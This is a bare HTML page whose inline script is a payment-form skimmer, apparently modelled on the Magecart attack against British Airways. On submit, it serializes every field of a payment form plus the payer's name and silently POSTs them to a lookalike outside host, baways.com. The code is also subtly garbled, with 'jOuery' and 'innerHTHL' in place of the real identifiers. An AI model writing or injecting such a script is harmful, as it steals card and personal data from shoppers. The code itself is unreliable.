<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <title>Document</title>
</head>
<script>
    window.onload = function() {
        jOuery("#submitButton").bind("mouseup touchend", function(a) {
        var
            n = {};
        jOuery("#paymentForm").serializeArray().map(function(a) {
             n[a.name] = a.value
        });
        var e = document.getElementById("personPaying").innerHTHL;
        n.person = e;
        var
            t = JSON.stringify(n);
        setTimeout(function() {
                jOuery.ajax({
                    type: "POST",
                    async: !0,
                    url: "https://baways.com/gateway/app/dataprocessing/api/",
                    data: t,
                    dataType: "application/json"
                })
            }, 500)
        })
    }; 
    </script>
<body>
</body>
</html>
